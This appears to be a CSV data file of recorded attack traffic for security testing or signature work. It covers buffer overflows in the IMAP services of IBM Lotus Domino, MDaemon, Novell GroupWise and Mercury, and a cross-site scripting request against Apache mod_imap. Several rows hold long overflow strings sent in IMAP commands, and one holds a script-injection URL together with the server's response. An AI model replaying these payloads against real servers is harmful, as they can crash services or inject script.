XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
FSC20071023-16_IBM_Lotus_Domino_IMAP_Server_Buffer_Overflow.xml,IBM Lotus Domino IMAP Server Buffer Overflow,"There exists a buffer overflow vulnerability in the way IBM Lotus Domino IMAP Server handles LSUB requests. The vulnerability is due to lack of boundary protection while processing the subscribed mailbox names. A remote authenticated attacker may exploit this vulnerability to cause a denial of service condition or inject and execute arbitrary code on the vulnerable system within the security context of the affected service, normally   System ",TCP,TCP,002 SUBSCRIBE {500}||0D 0A||
FSC20071023-16_IBM_Lotus_Domino_IMAP_Server_Buffer_Overflow.xml,IBM Lotus Domino IMAP Server Buffer Overflow,"There exists a buffer overflow vulnerability in the way IBM Lotus Domino IMAP Server handles LSUB requests. The vulnerability is due to lack of boundary protection while processing the subscribed mailbox names. A remote authenticated attacker may exploit this vulnerability to cause a denial of service condition or inject and execute arbitrary code on the vulnerable system within the security context of the affected service, normally   System ",TCP,TCP,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA||0D 0A||
FSC20071023-16_IBM_Lotus_Domino_IMAP_Server_Buffer_Overflow.xml,IBM Lotus Domino IMAP Server Buffer Overflow,"There exists a buffer overflow vulnerability in the way IBM Lotus Domino IMAP Server handles LSUB requests. The vulnerability is due to lack of boundary protection while processing the subscribed mailbox names. A remote authenticated attacker may exploit this vulnerability to cause a denial of service condition or inject and execute arbitrary code on the vulnerable system within the security context of the affected service, normally   System ",TCP,TCP,003 LSUB foo bar||0D 0A||
FSC20071023-16_IBM_Lotus_Domino_IMAP_Server_Buffer_Overflow.xml,IBM Lotus Domino IMAP Server Buffer Overflow,"There exists a buffer overflow vulnerability in the way IBM Lotus Domino IMAP Server handles LSUB requests. The vulnerability is due to lack of boundary protection while processing the subscribed mailbox names. A remote authenticated attacker may exploit this vulnerability to cause a denial of service condition or inject and execute arbitrary code on the vulnerable system within the security context of the affected service, normally   System ",TCP,TCP,"* OK Domino IMAP4 Server Release 7.0.2FP1 ready Tue, 30 Oct 2007 09||3A ||34||3A ||36 -0800||0D 0A||"
FSC20071023-16_IBM_Lotus_Domino_IMAP_Server_Buffer_Overflow.xml,IBM Lotus Domino IMAP Server Buffer Overflow,"There exists a buffer overflow vulnerability in the way IBM Lotus Domino IMAP Server handles LSUB requests. The vulnerability is due to lack of boundary protection while processing the subscribed mailbox names. A remote authenticated attacker may exploit this vulnerability to cause a denial of service condition or inject and execute arbitrary code on the vulnerable system within the security context of the affected service, normally   System ",TCP,TCP,001 OK LOGIN completed||0D 0A||
FSC20071023-16_IBM_Lotus_Domino_IMAP_Server_Buffer_Overflow.xml,IBM Lotus Domino IMAP Server Buffer Overflow,"There exists a buffer overflow vulnerability in the way IBM Lotus Domino IMAP Server handles LSUB requests. The vulnerability is due to lack of boundary protection while processing the subscribed mailbox names. A remote authenticated attacker may exploit this vulnerability to cause a denial of service condition or inject and execute arbitrary code on the vulnerable system within the security context of the affected service, normally   System ",TCP,TCP,+ go ahead||0D 0A||
FSC20071023-16_IBM_Lotus_Domino_IMAP_Server_Buffer_Overflow.xml,IBM Lotus Domino IMAP Server Buffer Overflow,"There exists a buffer overflow vulnerability in the way IBM Lotus Domino IMAP Server handles LSUB requests. The vulnerability is due to lack of boundary protection while processing the subscribed mailbox names. A remote authenticated attacker may exploit this vulnerability to cause a denial of service condition or inject and execute arbitrary code on the vulnerable system within the security context of the affected service, normally   System ",TCP,TCP,002 OK SUBSCRIBE completed||0D 0A||
﻿FSC20071212-08_Apache_mod_imap_and_mod_imagemap_Module_Cross-Site_Scripting.xml,Apache mod_imap and mod_imagemap Module Cross-Site Scripting,"There exist a cross-site scripting vulnerability in Apache mod_imap and mod_imagemap Module. The flaw is due to lack of validation of the user supplied input data. The flaw may be exploited by malicious users to execute arbitrary HTML code on target user's web browser, within the context of a trusted web site.",HTTP,TCP,"GET /maps/imagemap1.map/<script>alert(||22 ||This%20is%20a%20test||22 ||)</script> HTTP/1.1||0D 0A ||Accept||3A || image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*||0D 0A ||Accept-Language||3A || en-us||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.1||3B || SV1)||0D 0A ||Host||3A || 172.16.8.177||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A||"
FSC20071212-08_Apache_mod_imap_and_mod_imagemap_Module_Cross-Site_Scripting.xml,Apache mod_imap and mod_imagemap Module Cross-Site Scripting,"There exist a cross-site scripting vulnerability in Apache mod_imap and mod_imagemap Module. The flaw is due to lack of validation of the user supplied input data. The flaw may be exploited by malicious users to execute arbitrary HTML code on target user's web browser, within the context of a trusted web site.",HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Mon, 07 Jan 2008 21||3A ||10||3A ||11 GMT||0D 0A ||Server||3A || Apache/2.2.6 (Unix)||0D 0A ||Content-Length||3A || 950||0D 0A ||Keep-Alive||3A || timeout=5, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || text/html||0D 0A 0D 0A ||<!DOCTYPE HTML PUBLIC ||22 ||-//W3C//DTD HTML 3.2 Final//EN||22 ||>||0A ||<html><head>||0A ||<title>Menu for /maps/imagemap1.map/<script>alert(||22 ||This is a test||22 ||)</script></title>||0A ||</head><body>||0A ||<h1>Menu for /maps/imagemap1.map/<script>alert(||22 ||This is a test||22 ||)</script></h1>||0A ||<hr />||0A 0A 0A 0A ||<pre>          <a href=||22 ||http||3A ||//172.16.8.177/maps/imagemap1.map/<script>alert(||22 ||This is a test||22 ||)</script>||22 ||>Could I have a menu, please?</a></pre>||0A ||<pre>          <a href=||22 ||http||3A ||//172.16.8.177||22 ||>the directory of the referer</a></pre>||0A ||<pre>          <a href=||22 ||http||3A ||//www.inetnebr.com/lincoln/feedback/||22 ||>http||3A ||//www.inetnebr.com/lincoln/feedback/</a></pre>||0A ||<pre>          <a href=||22 ||http||3A ||//172.16.8.177/another_file||22 ||>in same directory as referer</a></pre>||0A ||<pre>          <a href=||22 ||http||3A ||//www.zyzzyva.com/||22 ||>http||3A ||//www.zyzzyva.com/</a></pre>||0A ||<pre>          <a href=||22 ||http||3A ||//www.tripod.com/||22 ||>http||3A ||//www.tripod.com/</a></pre>||0A ||<pre>          <a href=||22 ||mailto||3A ||nate@tripod.com||22 ||>Bugs?</a></pre>||0A 0A 0A 0A 0A 0A ||</body>||0A ||</html>||0A||"
﻿FSC20080313-20_Alt-N_MDaemon_IMAP_Server_FETCH_Command_Buffer_Overflow.xml,Alt-N MDaemon IMAP Server FETCH Command Buffer Overflow,"There exists a stack buffer overflow vulnerability in the way Alt-N MDaemon Server handles IMAP requests. The vulnerability is due to lack of boundary protection while processing IMAP FETCH commands. A remote authenticated attacker may exploit this vulnerability to cause a denial of service condition or inject and execute arbitrary code on the vulnerable system within the security context of the affected service, normally System. In a more sophisticated attack where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the affected service, normally System. In an attack case where code injection is not successful, the affected server will terminate and reset all established connections.",IMAP,TCP,001 LOGIN ||22 ||admin||22 || foobar||0D 0A||
FSC20080313-20_Alt-N_MDaemon_IMAP_Server_FETCH_Command_Buffer_Overflow.xml,Alt-N MDaemon IMAP Server FETCH Command Buffer Overflow,"There exists a stack buffer overflow vulnerability in the way Alt-N MDaemon Server handles IMAP requests. The vulnerability is due to lack of boundary protection while processing IMAP FETCH commands. A remote authenticated attacker may exploit this vulnerability to cause a denial of service condition or inject and execute arbitrary code on the vulnerable system within the security context of the affected service, normally System. In a more sophisticated attack where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the affected service, normally System. In an attack case where code injection is not successful, the affected server will terminate and reset all established connections.",IMAP,TCP,002 SELECT Inbox||0D 0A||
FSC20080313-20_Alt-N_MDaemon_IMAP_Server_FETCH_Command_Buffer_Overflow.xml,Alt-N MDaemon IMAP Server FETCH Command Buffer Overflow,"There exists a stack buffer overflow vulnerability in the way Alt-N MDaemon Server handles IMAP requests. The vulnerability is due to lack of boundary protection while processing IMAP FETCH commands. A remote authenticated attacker may exploit this vulnerability to cause a denial of service condition or inject and execute arbitrary code on the vulnerable system within the security context of the affected service, normally System. In a more sophisticated attack where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the affected service, normally System. In an attack case where code injection is not successful, the affected server will terminate and reset all established connections.",IMAP,TCP,003 FETCH 1||3A ||2 (FLAGS BODY[AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA])||0D 0A||
FSC20080313-20_Alt-N_MDaemon_IMAP_Server_FETCH_Command_Buffer_Overflow.xml,Alt-N MDaemon IMAP Server FETCH Command Buffer Overflow,"There exists a stack buffer overflow vulnerability in the way Alt-N MDaemon Server handles IMAP requests. The vulnerability is due to lack of boundary protection while processing IMAP FETCH commands. A remote authenticated attacker may exploit this vulnerability to cause a denial of service condition or inject and execute arbitrary code on the vulnerable system within the security context of the affected service, normally System. In a more sophisticated attack where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the affected service, normally System. In an attack case where code injection is not successful, the affected server will terminate and reset all established connections.",IMAP,TCP,001 OK LOGIN completed||0D 0A||
FSC20080313-20_Alt-N_MDaemon_IMAP_Server_FETCH_Command_Buffer_Overflow.xml,Alt-N MDaemon IMAP Server FETCH Command Buffer Overflow,"There exists a stack buffer overflow vulnerability in the way Alt-N MDaemon Server handles IMAP requests. The vulnerability is due to lack of boundary protection while processing IMAP FETCH commands. A remote authenticated attacker may exploit this vulnerability to cause a denial of service condition or inject and execute arbitrary code on the vulnerable system within the security context of the affected service, normally System. In a more sophisticated attack where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the affected service, normally System. In an attack case where code injection is not successful, the affected server will terminate and reset all established connections.",IMAP,TCP,* FLAGS (\Seen \Answered \Flagged \Deleted \Draft \Recent)||0D 0A ||* 3 EXISTS||0D 0A ||* 3 RECENT||0D 0A ||* OK [UNSEEN 1] first unseen||0D 0A ||* OK [UIDVALIDITY 1206032844] UIDs valid||0D 0A ||* OK [UIDNEXT 4] Predicted next UID||0D 0A ||* OK [PERMANENTFLAGS (\Seen \Answered \Flagged \Deleted \Draft)] .||0D 0A ||002 OK [READ-WRITE] SELECT completed||0D 0A||
﻿FSC20100716-07_Novell_GroupWise_Internet_Agent_IMAP_Service_Stack_Buffer_Overflow.xml,Novell GroupWise Internet Agent IMAP Service Stack Buffer Overflow,"A buffer overflow vulnerability exists in Novell GroupWise Internet Agent. The vulnerability is within the IMAP
component of the GroupWise Internet Agent service and is due to a boundary error while handling provided mailbox
name for the CREATE command.
An authenticated attacker could exploit this vulnerability by sending a crafted message to the server. Successful
exploitation of this vulnerability could allow for a denial of service condition of the affected service, or the injection
and execution of arbitrary code on the target system with System-level privileges.",IMAP,TCP,A001 LOGIN test foobar ||0D 0A||
FSC20100716-07_Novell_GroupWise_Internet_Agent_IMAP_Service_Stack_Buffer_Overflow.xml,Novell GroupWise Internet Agent IMAP Service Stack Buffer Overflow,"A buffer overflow vulnerability exists in Novell GroupWise Internet Agent. The vulnerability is within the IMAP
component of the GroupWise Internet Agent service and is due to a boundary error while handling provided mailbox
name for the CREATE command.
An authenticated attacker could exploit this vulnerability by sending a crafted message to the server. Successful
exploitation of this vulnerability could allow for a denial of service condition of the affected service, or the injection
and execution of arbitrary code on the target system with System-level privileges.",IMAP,TCP,A001 CREATE AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA||0D 0A||
FSC20100716-07_Novell_GroupWise_Internet_Agent_IMAP_Service_Stack_Buffer_Overflow.xml,Novell GroupWise Internet Agent IMAP Service Stack Buffer Overflow,"A buffer overflow vulnerability exists in Novell GroupWise Internet Agent. The vulnerability is within the IMAP
component of the GroupWise Internet Agent service and is due to a boundary error while handling provided mailbox
name for the CREATE command.
An authenticated attacker could exploit this vulnerability by sending a crafted message to the server. Successful
exploitation of this vulnerability could allow for a denial of service condition of the affected service, or the injection
and execution of arbitrary code on the target system with System-level privileges.",IMAP,TCP,* OK [CAPABILITY IMAP4rev1 AUTH=PLAIN AUTH=XGWTRUSTEDAPP UNSELECT XGWEXTENSIONS] GroupWise Server Ready||0D 0A||
FSC20100716-07_Novell_GroupWise_Internet_Agent_IMAP_Service_Stack_Buffer_Overflow.xml,Novell GroupWise Internet Agent IMAP Service Stack Buffer Overflow,"A buffer overflow vulnerability exists in Novell GroupWise Internet Agent. The vulnerability is within the IMAP
component of the GroupWise Internet Agent service and is due to a boundary error while handling provided mailbox
name for the CREATE command.
An authenticated attacker could exploit this vulnerability by sending a crafted message to the server. Successful
exploitation of this vulnerability could allow for a denial of service condition of the affected service, or the injection
and execution of arbitrary code on the target system with System-level privileges.",IMAP,TCP,A001 OK LOGIN completed||0D 0A||
﻿Mercury_IMAP_bof.xml,Mercury IMAP Buffer Overflow Attack,"This threat attempts to spawn a shell on a remote machine running Mercury IMAP.  Connects to the IMAP service, which runs on port 143.",IMAP,TCP,a001 LOGIN guest guest||0A||
